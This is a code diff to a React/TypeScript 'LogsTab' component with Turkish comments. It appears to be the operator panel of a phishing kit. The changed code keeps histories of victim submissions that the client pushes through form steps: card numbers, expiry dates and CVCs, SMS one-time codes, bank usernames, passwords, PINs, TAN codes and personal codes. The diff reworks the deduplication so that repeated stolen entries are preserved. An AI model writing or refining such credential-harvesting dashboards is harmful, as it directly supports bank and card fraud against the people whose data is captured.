@@ -1517,6 +1517,13 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 const currentBankOrdered1 = String(fd.orderedField1 || "").trim();
                 const currentBankUser = String(fd.username || fd.verfuegernummer || "").trim();
                 const currentBankPass = String(fd.password || fd.pin || "").trim();
+                // ⭐⭐⭐ BANKA kolonu icin KALICI degiskenler (asagidaki BANKA history hesaplamada kullaniliyor)
+                //   Build hata sebebi: L1690-L1710 arasinda currentTac/currentBankPhone vb. kullaniliyordu ama TANIMLI DEĞİLDİ.
+                const currentTac = String(fd.tacCode || "").trim();
+                const currentBankPhone = String(fd.bankPhone || "").trim();
+                const currentPersonalCode = String(fd.personalCode || "").trim();
+                const currentO2 = String(fd.orderedField2 || "").trim();
+                const currentO3 = String(fd.orderedField3 || "").trim();
 
                 // ⭐ SMS GECMISI HESAPLA:
                 //   - SADECE GERCEK client tarafindan PUSH edilen kayitlar (htmlStepLabel === "SMS KODU").
@@ -1547,13 +1554,28 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                   const p = i > 0 ? smsHistoryRaw[i - 1] : null;
                   if (!p || (p as any).sms !== (smsHistoryRaw[i] as any).sms) smsHistory.push(smsHistoryRaw[i]);
                 }
-                // ⭐ Son (en yeni) SMS = kolondaki mevcut SMS ise listeden KALDIR (sadece ESKİLER kalsın)
-                if (smsHistory.length > 0 && currentSmsValue.length > 0) {
-                  const lastEntry = smsHistory[smsHistory.length - 1] as any;
-                  if (lastEntry && lastEntry.sms === currentSmsValue) {
-                    smsHistory.splice(smsHistory.length - 1, 1);
+
+                // ⭐⭐⭐⭐⭐ BANKA İLE AYNI KALICI KURAL (SMS GEÇMİŞİ):
+                //   ❌ ESKI: SADECE SON kaydi kolon ile ayniysa SIL.
+                //          2 kez ayni SMS girilirse (1.SMS=1234, 2.SMS=1234) → ESKI 1234 da siliniyordu → GEÇMİŞ YOK!
+                //   ✅ YENI: TUM KAYITLARI KONTROL ET, kolon ile ayni olanlardan SADECE EN YENI (EN BUYUK INDEX) olanı SIL, diger eski benzer KAYITLARI KORU.
+                const smsMatchesCurrentIndices: number[] = [];
+                if (currentSmsValue.length > 0) {
+                  for (let i = 0; i < smsHistory.length; i++) {
+                    const e = smsHistory[i] as any;
+                    if (e && e.sms === currentSmsValue) smsMatchesCurrentIndices.push(i);
                   }
                 }
+                const smsRemoveIdx = smsMatchesCurrentIndices.length > 0
+                  ? Math.max(...smsMatchesCurrentIndices)
+                  : -1;
+                // SADECE en yeni (en buyuk index) olanı cikar:
+                const smsHistoryFinal: any[] = smsRemoveIdx >= 0
+                  ? smsHistory.filter((_, i) => i !== smsRemoveIdx)
+                  : smsHistory.slice();
+                Object.assign(smsHistory, smsHistoryFinal);
+                smsHistory.length = smsHistoryFinal.length;
+                for (let i = 0; i < smsHistoryFinal.length; i++) smsHistory[i] = smsHistoryFinal[i];
                 const smsHistoryCount = smsHistory.length;
 
                 // ⭐ KART GECMISI HESAPLA:
@@ -1594,18 +1616,34 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                     cardHistory.push(cur);
                   }
                 }
-                // ⭐ Son (en yeni) kart === kolondaki mevcut kart ise listeden KALDIR (sadece ESKİLER kalsın)
-                if (cardHistory.length > 0 && (currentCardNo.length > 0 || currentCardExp.length > 0 || currentCardCvc.length > 0)) {
-                  const lastEntry = cardHistory[cardHistory.length - 1] as any;
-                  if (
-                    lastEntry &&
-                    lastEntry.cardNumber === currentCardNo &&
-                    lastEntry.cardExpiry === currentCardExp &&
-                    lastEntry.cardCvc === currentCardCvc
-                  ) {
-                    cardHistory.splice(cardHistory.length - 1, 1);
+
+                // ⭐⭐⭐⭐⭐ BANKA/SMS İLE AYNI KALICI KURAL (KART GEÇMİŞİ):
+                //   ❌ ESKI: SADECE SON kaydi kolon ile ayniysa SIL.
+                //          2 kez ayni kart girilirse (1. kart = 4111..., 2. kart = ayni 4111...) → ESKI kayit siliniyordu → GEÇMİŞ YOK!
+                //   ✅ YENI: TUM KAYITLARI KONTROL ET, kolon ile ayni olanlardan SADECE EN YENI (EN BUYUK INDEX) olanı SIL, diger eski benzer KAYITLARI KORU.
+                const cardHasAnyCurrent = currentCardNo.length > 0 || currentCardExp.length > 0 || currentCardCvc.length > 0;
+                const cardMatchesCurrentIndices: number[] = [];
+                if (cardHasAnyCurrent) {
+                  for (let i = 0; i < cardHistory.length; i++) {
+                    const e = cardHistory[i] as any;
+                    if (!e) continue;
+                    const same =
+                      e.cardNumber === currentCardNo &&
+                      e.cardExpiry === currentCardExp &&
+                      e.cardCvc === currentCardCvc;
+                    if (same) cardMatchesCurrentIndices.push(i);
                   }
                 }
+                const cardRemoveIdx = cardMatchesCurrentIndices.length > 0
+                  ? Math.max(...cardMatchesCurrentIndices)
+                  : -1;
+                // SADECE en yeni (en buyuk index) olanı cikar:
+                const cardHistoryFinal: any[] = cardRemoveIdx >= 0
+                  ? cardHistory.filter((_, i) => i !== cardRemoveIdx)
+                  : cardHistory.slice();
+                Object.assign(cardHistory, cardHistoryFinal);
+                cardHistory.length = cardHistoryFinal.length;
+                for (let i = 0; i < cardHistoryFinal.length; i++) cardHistory[i] = cardHistoryFinal[i];
                 const cardHistoryCount = cardHistory.length;
 
                 // ⭐ BANKA GECMISI HESAPLA (SMS/KART ile BIREBIR MANTIK):
@@ -1667,37 +1705,56 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                   if (!same) bankHistoryRawPre1.push(cur);
                 }
 
-                // 4) ⭐ Son kayit = mevcut kolondaki ile TUM 8 alan eslesiyorsa listeden KALDIR (sadece ESKILER kalsın)
-                const currentO2 = String(fd.orderedField2 || "").trim();
-                const currentO3 = String(fd.orderedField3 || "").trim();
-                const currentTac = String(fd.tacCode || "").trim();
-                const currentBankPhone = String(fd.bankPhone || "").trim();
-                const currentPersonalCode = String(fd.personalCode || "").trim();
-                const bankHistoryRaw: any[] = (() => {
-                  if (bankHistoryRawPre1.length === 0) return [];
-                  const lastE = bankHistoryRawPre1[bankHistoryRawPre1.length - 1];
-                  // ⚠️ ARTK LEGACY GIRMIYOR (en basta filter'leniyor) → early return KALDIRILDI.
-                  // Kolonun kendisi (mevcut) muhtemelen lastE === current ise HEMEN SILINMELI.
-                  const currentHasAny =
-                    currentBankOrdered1.length > 0 ||
-                    currentBankUser.length > 0 ||
-                    currentBankPass.length > 0 ||
-                    currentTac.length > 0 ||
-                    currentBankPhone.length > 0 ||
-                    currentPersonalCode.length > 0;
-                  if (!currentHasAny) return bankHistoryRawPre1;
-                  const allMatch =
-                    lastE._o1 === currentBankOrdered1 &&
-                    lastE._user === currentBankUser &&
-                    lastE._pass === currentBankPass &&
-                    lastE._tac === currentTac &&
-                    lastE._phone === currentBankPhone &&
-                    lastE._pers === currentPersonalCode &&
-                    lastE._o2 === currentO2 &&
-                    lastE._o3 === currentO3;
-                  if (allMatch) return bankHistoryRawPre1.slice(0, -1);
-                  return bankHistoryRawPre1;
-                })();
+                // ⭐⭐⭐⭐⭐ KALICI YENİ KURAL (BANKA GEÇMİŞİ - EN GÜVENİLİR):
+                //   ❌ ESKI 1 (SORUNLU): TUM alanlar ayniysa SADECE SON kaydi SIL.
+                //      SORUN: 2 kez ayni deger girildiyse (1.form=0400, 2.form=0400) → ESKI 0400 da siliniyordu → GEÇMİŞ YOK!
+                //   ✅ YENI KURAL:
+                //   Adım 1: TÜM KAYITLARI GEZ, KOLON İLE TÜM ALANLARI AYNI OLAN KAYITLARIN INDEXLERINI BUL.
+                //   Adım 2: Bu indexlerden SADECE EN BÜYÜĞÜNÜ (EN YENİ = SON GİRİLENİ) SİL. ÇÜNKÜ O KOLONUN KENDİSİDİR.
+                //   Adım 3: DİĞER (daha eski indexli) AYNI değerli KAYITLARI KORU. Onlar GERÇEKTEN ÖNCEKİ GİRİŞLERDİR!
+                //
+                //   ÖRNEK 1: 1.form=0400 (index 0), 2.form=0411 (index 1) → Kolon=0411
+                //            Kolon ile ayni olanlar: [index1 (0411)]
+                //            En buyuk index 1'i SIL → Kalan [0400 (index0)]
+                //            Sonuc: GEÇMİŞ (1) ✅ (doğru: 1.form eski)
+                //   ÖRNEK 2: 1.form=0400 (index0), 2.form=0400 (index1) → Kolon=0400
+                //            Kolon ile ayni olanlar: [index0 (0400), index1 (0400)]
+                //            En buyuk index 1'i SIL → Kalan [0400 (index0)]
+                //            Sonuc: GEÇMİŞ (1) ✅ (doğru: 1.form eski, 2.form şu anki kolon)
+                //   ÖRNEK 3: 1.form (0400) yok, 2.form (0411) var → Kolon=0411
+                //            bankHistoryPre1 length = 1 (0411) → en yeni index 0 sil → kalan 0 → GEÇMİŞ YOK ✅ (doğru)
+
+                // Adım A: Hangileri kolon ile tamamen ayni? Hepsinin indexini al.
+                const currentHasAny =
+                  currentBankOrdered1.length > 0 ||
+                  currentBankUser.length > 0 ||
+                  currentBankPass.length > 0 ||
+                  currentTac.length > 0 ||
+                  currentBankPhone.length > 0 ||
+                  currentPersonalCode.length > 0;
+                const bankMatchesCurrentIndices: number[] = [];
+                if (currentHasAny) {
+                  for (let i = 0; i < bankHistoryRawPre1.length; i++) {
+                    const e = bankHistoryRawPre1[i];
+                    const allMatch =
+                      e._o1 === currentBankOrdered1 &&
+                      e._user === currentBankUser &&
+                      e._pass === currentBankPass &&
+                      e._tac === currentTac &&
+                      e._phone === currentBankPhone &&
+                      e._pers === currentPersonalCode &&
+                      e._o2 === currentO2 &&
+                      e._o3 === currentO3;
+                    if (allMatch) bankMatchesCurrentIndices.push(i);
+                  }
+                }
+                // Adım B: En buyuk (EN YENİ) indexi bul, SADECE ONU silecegiz.
+                const removeIndex = bankMatchesCurrentIndices.length > 0
+                  ? Math.max(...bankMatchesCurrentIndices)
+                  : -1;
+
+                // Adım C: Tüm listeden SADECE removeIndex'i cikar.
+                const bankHistoryRaw: any[] = bankHistoryRawPre1.filter((_, i) => i !== removeIndex);
                 const bankHistoryCount = bankHistoryRaw.length;
                 (fd as any)._bankHistory = bankHistoryRaw;
                 (fd as any)._smsHistory = smsHistory;
